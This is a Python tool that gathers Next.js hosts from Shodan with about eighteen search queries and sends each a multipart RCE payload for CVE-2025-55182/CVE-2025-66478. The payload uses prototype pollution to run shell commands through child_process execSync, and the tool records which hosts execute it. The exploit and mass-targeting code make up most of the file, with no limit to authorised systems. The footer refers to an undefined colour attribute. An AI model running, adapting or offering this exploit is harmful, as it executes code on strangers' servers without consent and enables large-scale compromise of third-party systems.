#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     CVE-2025-55182 & CVE-2025-66478 Advanced Shodan Scanner             ║
║                                                                           ║
║     Original Author:  Emre Davut (https://github.com/emredavut)          ║
║     Enhanced By:      CyberTechAjju                                       ║
║     Motto:            Keep Learning Keep Hacking                          ║
╚═══════════════════════════════════════════════════════════════════════════╝

Advanced Shodan scanner for detecting vulnerable Next.js applications
with React Server Components RCE vulnerabilities.

CREDITS:
- Original basic script: Emre Davut (https://github.com/emredavut)
- Advanced enhancements, guided input mode, cyberpunk UI, 
  interactive features, and additional capabilities: CyberTechAjju

ENHANCEMENTS:
✓ Guided Setup Wizard with interactive configuration
✓ Cyberpunk-themed neon UI with animations
✓ Support for custom Shodan queries
✓ File-based target loading
✓ Enhanced error handling and reporting
✓ Response time tracking
✓ Detailed JSON reports
✓ CyberTechAjju branding throughout
"""

import sys
import json
import time
import re
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Set, Optional

# Import validation
MISSING_PACKAGES = []

try:
    import shodan
except ImportError:
    MISSING_PACKAGES.append("shodan")

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    MISSING_PACKAGES.append("requests")

try:
    from tqdm import tqdm
except ImportError:
    MISSING_PACKAGES.append("tqdm")

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    MISSING_PACKAGES.append("colorama")

if MISSING_PACKAGES:
    print(f"\n❌ Missing required packages: {', '.join(MISSING_PACKAGES)}")
    print(f"\n📦 Install with: pip install {' '.join(MISSING_PACKAGES)}")
    sys.exit(1)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

DEFAULT_API_KEY = "YOUR_API_KEY_HERE"
DEFAULT_RESULTS_PER_QUERY = 100
DEFAULT_THREADS = 20
DEFAULT_TIMEOUT = 10

# Shodan search queries for Next.js applications - Enhanced for maximum coverage
DEFAULT_SHODAN_QUERIES = [
    'http.html:"__NEXT_DATA__"',
    'http.html:"_next/static"',
    'http.html:"next-head-count"',
    'http.component:"Next.js"',
    'http.component:"next.js"',
    'http.title:"Next.js"',
    'http.title:"next.js"',
    'http.html:"/_next/data/"',
    'http.html:"self.__next"',
    'http.html:"__NEXT_LOADED_PAGES__"',
    'http.html:"__next_f"',
    'http.html:"buildId"',
    'http.html:"pageProps"',
    'http.html:"_app-"',
    'port:3000 http.html:"Next.js"',
    'port:443 http.html:"__NEXT_DATA__"',
    'port:80 http.html:"__NEXT_DATA__"',
    'cpe:"cpe:2.3:a:facebook:react"',
]

# ═══════════════════════════════════════════════════════════════════════════
# COLOR THEME - Cyberpunk Neon
# ═══════════════════════════════════════════════════════════════════════════

class Colors:
    """Enhanced color scheme with neon effects"""
    # Basic colors
    BLUE = Fore.BLUE
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    RED = Fore.RED
    CYAN = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    WHITE = Fore.WHITE
    GRAY = Fore.LIGHTBLACK_EX
    
    # Neon colors
    NEON_GREEN = Fore.LIGHTGREEN_EX
    NEON_BLUE = Fore.LIGHTCYAN_EX
    NEON_PINK = Fore.LIGHTMAGENTA_EX
    NEON_YELLOW = Fore.LIGHTYELLOW_EX
    
    # Styles
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL


# ═══════════════════════════════════════════════════════════════════════════
# BANNER & UI
# ═══════════════════════════════════════════════════════════════════════════

def print_banner():
    """Display animated cyberpunk banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Colors.NEON_BLUE}{Colors.BOLD}
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║                                                                           ║
    ║   ██████╗██╗   ██╗██████╗ ███████╗██████╗ ████████╗███████╗ ██████╗██╗  ║
    ║  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔════╝██║  ║
    ║  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝   ██║   █████╗  ██║     ███████║
    ║  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗   ██║   ██╔══╝  ██║     ██╔══██║
    ║  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║   ██║   ███████╗╚██████╗██║  ██║
    ║   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
    ║                                                                           ║{Colors.RESET}
{Colors.NEON_PINK}{Colors.BOLD}    ║   █████╗      ██╗     ██╗██╗   ██╗                                       ║
    ║  ██╔══██╗     ██║     ██║██║   ██║                                       ║
    ║  ███████║     ██║     ██║██║   ██║                                       ║
    ║  ██╔══██║██   ██║██   ██║██║   ██║                                       ║
    ║  ██║  ██║╚█████╔╝╚█████╔╝╚██████╔╝                                       ║
    ║  ╚═╝  ╚═╝ ╚════╝  ╚════╝  ╚═════╝                                        ║{Colors.RESET}
{Colors.NEON_BLUE}{Colors.BOLD}    ║                                                                           ║
    ╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.NEON_GREEN}    ┌───────────────────────────────────────────────────────────────────────────┐
    │  {Colors.WHITE}{Colors.BOLD}Advanced Shodan Scanner for CVE-2025-55182 & CVE-2025-66478{Colors.RESET}{Colors.NEON_GREEN}         │
    │  {Colors.CYAN}React Server Components RCE Scanner{Colors.RESET}{Colors.NEON_GREEN}                                   │
    └───────────────────────────────────────────────────────────────────────────┘{Colors.RESET}

{Colors.GRAY}    ┌───────────────────────────────────────────────────────────────────────────┐
    │  {Colors.NEON_YELLOW}Original:{Colors.RESET} {Colors.WHITE}Emre Davut{Colors.RESET} {Colors.GRAY}(https://github.com/emredavut){Colors.RESET}{Colors.GRAY}              │
    │  {Colors.NEON_YELLOW}Enhanced:{Colors.RESET} {Colors.WHITE}CyberTechAjju{Colors.RESET}{Colors.GRAY}                                                   │
    │  {Colors.NEON_YELLOW}Motto:{Colors.RESET}    {Colors.NEON_PINK}{Colors.BOLD}Keep Learning Keep Hacking{Colors.RESET}{Colors.GRAY}                                  │
    │  {Colors.NEON_YELLOW}Version:{Colors.RESET}  {Colors.WHITE}2.0.0 Advanced Edition{Colors.RESET}{Colors.GRAY}                                       │
    └───────────────────────────────────────────────────────────────────────────┘{Colors.RESET}
"""
    print(banner)
    time.sleep(0.3)


def print_section_header(title: str, step: str = ""):
    """Print styled section header"""
    if step:
        print(f"\n{Colors.NEON_BLUE}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.NEON_BLUE}{Colors.BOLD}║{Colors.RESET}  {Colors.WHITE}{Colors.BOLD}{step} {title}{Colors.RESET}")
        print(f"{Colors.NEON_BLUE}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    else:
        print(f"\n{Colors.CYAN}{'━' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BOLD}{title}{Colors.RESET}")
        print(f"{Colors.CYAN}{'━' * 75}{Colors.RESET}\n")


def print_success(message: str):
    """Print success message"""
    print(f"{Colors.GREEN}✓{Colors.RESET} {message}")


def print_error(message: str):
    """Print error message"""
    print(f"{Colors.RED}✗{Colors.RESET} {message}")


def print_info(message: str):
    """Print info message"""
    print(f"{Colors.CYAN}ℹ{Colors.RESET} {message}")


def print_warning(message: str):
    """Print warning message"""
    print(f"{Colors.YELLOW}⚠{Colors.RESET} {message}")


# ═══════════════════════════════════════════════════════════════════════════
# GUIDED USER INPUT MODE
# ═══════════════════════════════════════════════════════════════════════════

def guided_input_mode() -> Dict:
    """Simplified wizard - only asks for API key, uses optimal defaults"""
    config = {}
    
    print_section_header("QUICK SETUP", "")
    print(f"{Colors.CYAN}Enter your Shodan API key to start scanning.{Colors.RESET}")
    print(f"{Colors.GRAY}All other settings are optimized for maximum results.{Colors.RESET}\n")
    
    # Only ask for API Key
    print(f"{Colors.NEON_BLUE}{'━' * 75}{Colors.RESET}")
    print(f"{Colors.WHITE}{Colors.BOLD}Shodan API Key Required{Colors.RESET}")
    print(f"{Colors.NEON_BLUE}{'━' * 75}{Colors.RESET}\n")
    
    api_key = input(f"{Colors.YELLOW}Enter your Shodan API key: {Colors.RESET}").strip()
    
    if not api_key:
        print_error("No API key provided. Please run again with a valid API key.")
        sys.exit(1)
    
    # Set optimal defaults for maximum coverage
    config['api_key'] = api_key
    config['mode'] = 'shodan'
    config['queries'] = DEFAULT_SHODAN_QUERIES
    config['results_per_query'] = 200  # Increased for better coverage
    config['threads'] = 30  # More threads for faster scanning
    config['timeout'] = 15  # Longer timeout for stability
    config['save_results'] = True  # Always save results
    config['output_prefix'] = 'scan'
    
    print_success(f"API Key configured: {api_key[:10]}...{api_key[-5:]}")
    
    print(f"\n{Colors.NEON_GREEN}{'━' * 75}{Colors.RESET}")
    print(f"{Colors.WHITE}{Colors.BOLD}Configuration (Optimized for Maximum Results){Colors.RESET}")
    print(f"{Colors.NEON_GREEN}{'━' * 75}{Colors.RESET}\n")
    
    display_config(config)
    
    print(f"\n{Colors.NEON_GREEN}{Colors.BOLD}✓ Ready to scan with optimized settings!{Colors.RESET}")
    print(f"{Colors.GRAY}  • Using all {len(DEFAULT_SHODAN_QUERIES)} Shodan queries{Colors.RESET}")
    print(f"{Colors.GRAY}  • Collecting both IPs and domains{Colors.RESET}")
    print(f"{Colors.GRAY}  • Results will be automatically saved{Colors.RESET}\n")
    
    time.sleep(1)
    
    return config


def display_config(config: Dict):
    """Display current configuration"""
    print(f"{Colors.CYAN}  ┌── Current Configuration{Colors.RESET}")
    print(f"{Colors.CYAN}  │{Colors.RESET}")
    
    if 'api_key' in config:
        masked_key = f"{config['api_key'][:10]}...{config['api_key'][-5:]}"
        print(f"{Colors.CYAN}  ├──{Colors.RESET} {Colors.BOLD}API Key:{Colors.RESET}     {Colors.WHITE}{masked_key}{Colors.RESET}")
    
    print(f"{Colors.CYAN}  ├──{Colors.RESET} {Colors.BOLD}Mode:{Colors.RESET}        {Colors.MAGENTA}{config.get('mode', 'shodan')}{Colors.RESET}")
    
    if config.get('mode') == 'shodan':
        print(f"{Colors.CYAN}  ├──{Colors.RESET} {Colors.BOLD}Queries:{Colors.RESET}     {Colors.WHITE}{len(config.get('queries', []))}{Colors.RESET}")
    elif config.get('mode') == 'file':
        print(f"{Colors.CYAN}  ├──{Colors.RESET} {Colors.BOLD}Target File:{Colors.RESET} {Colors.WHITE}{config.get('target_file', 'N/A')}{Colors.RESET}")
    
    print(f"{Colors.CYAN}  ├──{Colors.RESET} {Colors.BOLD}Results:{Colors.RESET}     {Colors.WHITE}{config.get('results_per_query', DEFAULT_RESULTS_PER_QUERY)}{Colors.RESET}")
    print(f"{Colors.CYAN}  ├──{Colors.RESET} {Colors.BOLD}Threads:{Colors.RESET}     {Colors.WHITE}{config.get('threads', DEFAULT_THREADS)}{Colors.RESET}")
    print(f"{Colors.CYAN}  ├──{Colors.RESET} {Colors.BOLD}Timeout:{Colors.RESET}     {Colors.WHITE}{config.get('timeout', DEFAULT_TIMEOUT)}s{Colors.RESET}")
    print(f"{Colors.CYAN}  └──{Colors.RESET} {Colors.BOLD}Save:{Colors.RESET}        {Colors.WHITE}{config.get('save_results', True)}{Colors.RESET}")


# ═══════════════════════════════════════════════════════════════════════════
# SHODAN SEARCH & TARGET EXTRACTION
# ═══════════════════════════════════════════════════════════════════════════

def search_shodan(api_key: str, query: str, limit: int = 100) -> List[Dict]:
    """Search Shodan for targets matching query"""
    try:
        api = shodan.Shodan(api_key)
        results = api.search(query, limit=limit)
        return results['matches']
    except shodan.APIError as e:
        print_error(f"Shodan API Error: {e}")
        return []
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        return []


def extract_targets(matches: List[Dict]) -> Set[str]:
    """Extract URLs from Shodan matches - Gets BOTH IPs and domains for maximum coverage"""
    targets = set()
    
    for match in matches:
        ip = match.get('ip_str', '')
        port = match.get('port', 80)
        hostnames = match.get('hostnames', [])
        
        is_ssl = port == 443 or 'ssl' in match.get('tags', [])
        protocol = 'https' if is_ssl else 'http'
        
        # Add ALL hostnames (domains)
        for hostname in hostnames:
            if hostname:
                url = f"{protocol}://{hostname}" if port in [80, 443] else f"{protocol}://{hostname}:{port}"
                targets.add(url)
        
        # ALSO add IP address (not just fallback - we want BOTH)
        if ip:
            url = f"{protocol}://{ip}" if port in [80, 443] else f"{protocol}://{ip}:{port}"
            targets.add(url)
    
    return targets


def load_targets_from_file(filename: str) -> Set[str]:
    """Load targets from a file"""
    targets = set()
    
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # Add protocol if missing
                    if not line.startswith(('http://', 'https://')):
                        line = f'https://{line}'
                    targets.add(line)
        return targets
    except Exception as e:
        print_error(f"Failed to load targets from file: {e}")
        return set()


# ═══════════════════════════════════════════════════════════════════════════
# VULNERABILITY SCANNING
# ═══════════════════════════════════════════════════════════════════════════

def build_rce_payload(command: str = 'echo $((41*271))') -> tuple:
    """Build RCE exploitation payload"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{command}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )
    
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )
    
    parts = []
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")
    
    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def check_vulnerability(url: str, timeout: int = 10) -> Dict:
    """Check if target is vulnerable to CVE-2025-55182"""
    result = {
        'url': url,
        'vulnerable': False,
        'status': None,
        'error': None,
        'response_time': None
    }
    
    try:
        start_time = time.time()
        body, content_type = build_rce_payload()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': 'b5dce965',
            'Content-Type': content_type,
            'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
        }
        
        body_bytes = body.encode('utf-8') if isinstance(body, str) else body
        
        response = requests.post(
            f"{url}/",
            headers=headers,
            data=body_bytes,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        
        result['response_time'] = round(time.time() - start_time, 2)
        result['status'] = response.status_code
        
        # Check for RCE indicator
        redirect_header = response.headers.get('X-Action-Redirect', '')
        if re.search(r'.*/login\?a=11111.*', redirect_header):
            result['vulnerable'] = True
        
    except requests.exceptions.SSLError as e:
        result['error'] = "SSL Error"
    except requests.exceptions.ConnectionError:
        result['error'] = "Connection Failed"
    except requests.exceptions.Timeout:
        result['error'] = "Timeout"
    except RequestException as e:
        result['error'] = f"Request Error: {str(e)[:50]}"
    except Exception as e:
        result['error'] = f"Error: {str(e)[:50]}"
    
    return result


def scan_targets(targets: List[str], threads: int = 20, timeout: int = 10) -> tuple:
    """Scan multiple targets for vulnerabilities"""
    vulnerable = []
    not_vulnerable = []
    errors = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_vulnerability, target, timeout): target 
                   for target in targets}
        
        with tqdm(total=len(targets), 
                 desc=f"{Colors.CYAN}Scanning{Colors.RESET}", 
                 unit="target", 
                 ncols=80,
                 bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]') as pbar:
            
            for future in as_completed(futures):
                result = future.result()
                
                if result['vulnerable']:
                    vulnerable.append(result)
                    tqdm.write(f"{Colors.GREEN}✓ VULNERABLE{Colors.RESET} {result['url']} ({result['response_time']}s)")
                elif result['error']:
                    errors.append(result)
                    if result['error'] not in ['Timeout', 'Connection Failed']:
                        tqdm.write(f"{Colors.YELLOW}⚠ ERROR{Colors.RESET} {result['url']}: {result['error']}")
                else:
                    not_vulnerable.append(result)
                
                pbar.update(1)
    
    return vulnerable, not_vulnerable, errors


# ═══════════════════════════════════════════════════════════════════════════
# OUTPUT & REPORTING
# ═══════════════════════════════════════════════════════════════════════════

def save_results(vulnerable: List[Dict], filename: str) -> bool:
    """Save vulnerable targets to file"""
    try:
        with open(filename, 'w') as f:
            for result in vulnerable:
                f.write(f"{result['url']}\n")
        return True
    except Exception as e:
        print_error(f"Failed to save results: {e}")
        return False


def save_detailed_report(data: Dict, filename: str) -> bool:
    """Save detailed JSON report"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception as e:
        print_error(f"Failed to save report: {e}")
        return False


def display_summary(vulnerable: List, not_vulnerable: List, errors: List, 
                   total: int, start_time: float):
    """Display scan summary"""
    duration = time.time() - start_time
    
    print(f"\n{Colors.BOLD}{'═' * 75}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.WHITE}SCAN SUMMARY{Colors.RESET}")
    print(f"{Colors.BOLD}{'═' * 75}{Colors.RESET}\n")
    
    print(f"  {Colors.CYAN}Total Targets:{Colors.RESET}     {Colors.WHITE}{total}{Colors.RESET}")
    
    if vulnerable:
        print(f"  {Colors.RED}{Colors.BOLD}Vulnerable:{Colors.RESET}        {Colors.RED}{Colors.BOLD}{len(vulnerable)}{Colors.RESET}")
    else:
        print(f"  {Colors.GREEN}Vulnerable:{Colors.RESET}        {Colors.WHITE}0{Colors.RESET}")
    
    print(f"  {Colors.WHITE}Not Vulnerable:{Colors.RESET}    {Colors.WHITE}{len(not_vulnerable)}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Errors:{Colors.RESET}            {Colors.WHITE}{len(errors)}{Colors.RESET}")
    print(f"  {Colors.CYAN}Scan Duration:{Colors.RESET}     {Colors.WHITE}{duration:.2f}s{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}{'═' * 75}{Colors.RESET}\n")


# ═══════════════════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════════════════

def main():
    """Main execution flow"""
    print_banner()
    
    # Use guided input if no args, otherwise use defaults
    if len(sys.argv) == 1:
        config = guided_input_mode()
    else:
        # Simple command-line mode
        config = {
            'api_key': DEFAULT_API_KEY,
            'mode': 'shodan',
            'queries': DEFAULT_SHODAN_QUERIES,
            'results_per_query': DEFAULT_RESULTS_PER_QUERY,
            'threads': DEFAULT_THREADS,
            'timeout': DEFAULT_TIMEOUT,
            'save_results': True,
            'output_prefix': 'scan'
        }
        
        # Allow API key as first argument
        if len(sys.argv) > 1:
            config['api_key'] = sys.argv[1]
    
    start_time = time.time()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_file = f"{config['output_prefix']}_vulnerable_{timestamp}.txt"
    report_file = f"{config['output_prefix']}_report_{timestamp}.json"
    
    # Collect targets
    all_targets = set()
    
    if config['mode'] == 'file':
        print_section_header("Loading Targets from File", "Step 1:")
        all_targets = load_targets_from_file(config['target_file'])
        print_success(f"Loaded {len(all_targets)} targets from file")
    
    else:  # Shodan mode
        print_section_header("Collecting Targets from Shodan", "Step 1:")
        print_info(f"API Key: {config['api_key'][:10]}...{config['api_key'][-5:]}\n")
        
        for i, query in enumerate(config['queries'], 1):
            print(f"  [{i}/{len(config['queries'])}] {query[:55]}...", end=' ')
            
            matches = search_shodan(config['api_key'], query, config['results_per_query'])
            
            if matches:
                targets = extract_targets(matches)
                all_targets.update(targets)
                print(f"{Colors.GREEN}{len(targets)} targets{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}No results{Colors.RESET}")
            
            # Rate limiting
            if i < len(config['queries']):
                time.sleep(1)
        
        print(f"\n  {Colors.BOLD}Total unique targets: {len(all_targets)}{Colors.RESET}")
    
    if not all_targets:
        print_error("\nNo targets found")
        return
    
    # Scan targets
    print_section_header("Scanning for Vulnerabilities", "Step 2:")
    print_info(f"Threads: {config['threads']} | Timeout: {config['timeout']}s\n")
    
    vulnerable, not_vulnerable, errors = scan_targets(
        sorted(all_targets),
        threads=config['threads'],
        timeout=config['timeout']
    )
    
    # Save results
    if config['save_results']:
        print_section_header("Saving Results", "Step 3:")
        
        if vulnerable:
            if save_results(vulnerable, output_file):
                print_success(f"Vulnerable targets saved: {output_file}")
        
        # Save detailed report
        report_data = {
            'scan_time': datetime.now().isoformat(),
            'configuration': {
                'mode': config['mode'],
                'threads': config['threads'],
                'timeout': config['timeout'],
                'results_per_query': config.get('results_per_query', 'N/A')
            },
            'statistics': {
                'total_targets': len(all_targets),
                'vulnerable_count': len(vulnerable),
                'not_vulnerable_count': len(not_vulnerable),
                'error_count': len(errors)
            },
            'vulnerable_targets': [v['url'] for v in vulnerable],
            'cve': ['CVE-2025-55182', 'CVE-2025-66478'],
            'author': 'CyberTechAjju'
        }
        
        if save_detailed_report(report_data, report_file):
            print_success(f"Detailed report saved: {report_file}")
    
    # Display summary
    display_summary(vulnerable, not_vulnerable, errors, len(all_targets), start_time)
    
    if vulnerable:
        print(f"{Colors.NEON_GREEN}{Colors.BOLD}🎯 Found {len(vulnerable)} vulnerable target(s)!{Colors.RESET}")
        print(f"   Results saved to: {Colors.CYAN}{output_file}{Colors.RESET}\n")
    else:
        print(f"{Colors.YELLOW}⚠ No vulnerable targets found{Colors.RESET}\n")
    
    # Footer
    print(f"{Colors.GRAY}{'━' * 75}{Colors.RESET}")
    print(f"{Colors.NEON_PURPLE}{Colors.BOLD}Keep Learning Keep Hacking{Colors.RESET}")
    print(f"{Colors.GRAY}By {Colors.NEON_YELLOW}CyberTechAjju{Colors.RESET}")
    print(f"{Colors.GRAY}{'━' * 75}{Colors.RESET}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ Scan interrupted by user{Colors.RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}✗ Unexpected error: {e}{Colors.RESET}\n")
        import traceback
        traceback.print_exc()
        sys.exit(1)
